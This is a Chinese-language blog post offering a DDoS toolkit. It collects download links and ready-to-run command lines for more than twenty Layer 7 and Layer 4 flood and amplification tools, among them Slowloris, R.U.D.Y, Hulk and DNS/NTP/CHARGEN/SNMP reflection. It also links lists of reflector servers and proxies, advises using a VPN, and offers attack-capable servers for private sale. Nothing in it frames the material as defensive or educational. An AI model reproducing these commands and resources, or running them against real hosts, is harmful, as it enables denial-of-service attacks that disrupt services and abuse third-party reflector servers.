title: 各种Ddos反射攻击脚本
date: 1970-01-01 00:00:00
categories:
tags:
---
做个备份，留着收藏

需要有个vpn。

需要G口发包服务器或者高防服务器私聊我

```txt
Layer 7

ARME (For Apache Servers) source:
http://www.mediafire.com/view/5evl45bx12jvod8/arme.c
script:
http://www.mediafire.com/download/x09c0ci57m11ye4/arme
./arme http://google.com 5000 proxies.txt 3600 0
GHP (Get / Head / Post ) source:
http://www.mediafire.com/view/h1k0rnot5x55x1m/ghp.c
script:
http://www.mediafire.com/download/b5jtdhjpjc6j3co/GHP
./ghp http://google.com GET 5000 proxies.txt 3600 0 %random%

Hulk (Python) source:
http://www.mediafire.com/view/zzayd073xt6xj5f/hulk.py
python hulk.py http://google.com
Rand (Perl) source:
http://www.mediafire.com/view/5f0188o19kkz5d8/Rand.pl
perl rand.pl http://google.com 3600

R.U.D.Y source: http://www.mediafire.com/view/mf9qhehd95dru69/rudy.c
script: http://www.mediafire.com/download/6bpwhhga5cvbd4y/rudy
./rudy http://google.com 1 5000 proxies.txt 3600 0 %random%

SlowLoris source:
http://www.mediafire.com/view/6an1elr7wz32gqx/slow.c script:
http://www.mediafire.com/download/vst9mbune5r3vnk/slow
./slow http://google.com 5000 proxies.txt 3600 0

XML-RPC Pingback ( C version ) script:
http://www.mediafire.com/download/ppo0kpcf699qv1l/xml
./xml http://google.com xml.txt 10000 3600

XML-RPC Pingback ( Perl Version ) source:
http://pastebin.com/LXzyrYrB perl
xml.pl http://google.com/ 10000 xmlrpc.txt 3600

XML-RPC Pingback ( PHP Version ) source: http://pastebin.com/UPu1hd3g
php xml.php xml.txt 10000

007 Goldeneye source: http://pastebin.com/FtBTrB15
python 007.py http://google.com

Pyloris source: http://sourceforge.net/projects/pyloris/
pyloris.py http://google.com 80 0 3600 200 60000 2

Layer 4

Fragmentation Script ! script:
https://www.mediafire.com/?34adxv2nhtp8313
./fragmentation 192.154.22.10

DNS AMP (UDP) source: http://pastebin.com/D2RSDd9X script:
http://www.mediafire.com/download/29lsum...89b/DNSAMP ./amp 127.0.0.1
80 amp.txt 2 3600

CHARGEN source: http://pastebin.com/iteE3FsC
./chargen 127.0.0.1 80 chargen.txt 2 -1 3600

TCP (Advanced ESSYN) source: http://pastebin.com/b0KAM2up script:
http://www.mediafire.com/download/j4x32q4s5cmcwwh/TCP
./tcp 127.0.0.1 80 2 -1 3600

SNMP (C Version) source: http://pastebin.com/0paGRUiU script:
http://www.mediafire.com/download/4alph4l98wd6c5v/SNMP

SNMP (Python Version) source: http://pastebin.com/0C3gBJ8S
./snmp -t 127.0.0.1 -f snmp.txt -l 30

Spoofed UDP source: http://pastebin.com/8HS7baKd script:
http://www.mediafire.com/download/ztdr994vcs4xxaq/SUDP
./sudp 127.0.0.1 80 5 5 3600

NTP (Python) source: http://pastebin.com/Rgq3mWem
python ntp.py 127.0.0.1 ntp.txt 5

NTP (Perl) source: http://pastebin.com/9kGK4HeB perl
ntp.pl 127.0.0.1 80 3600 ntp.txt 5

DrDos source: http://pastebin.com/xxm6QbmH
perl drdos.pl 127.0.0.1 80 servers.txt 5 tcp 10 3600

Haven script: http://www.mediafire.com/download/2r5dm6d6ewb9w2w/haven
./haven -d 127.0.0.1 -s 255.255.255.255 -t 3600 -z 30

ACK script: http://www.mediafire.com/download/7ojx7bawpnw25ch/ack
./ack 127.0.0.1 3600
```

附送一些反射服务器Lists !

```txt
DNS AMP ( Domain Format )

List 1 http://pastebin.com/5g8U1KXD List 2
http://pastebin.com/qannUPH6 List 3 http://pastebin.com/C2ef6zm7 List
4 http://www.mediafire.com/view/a9akhwfdmg...043014.txt

CHARGEN AMP (IP Format )

http://pastebin.com/U4U5Ndhu

Pingback List !

https://www.mediafire.com/?obx6opa4oqbl85b

Fresh Proxy List

List 1 http://pastebin.com/caJVz4y0 List 2
http://pastebin.com/z0y0VPVG
```
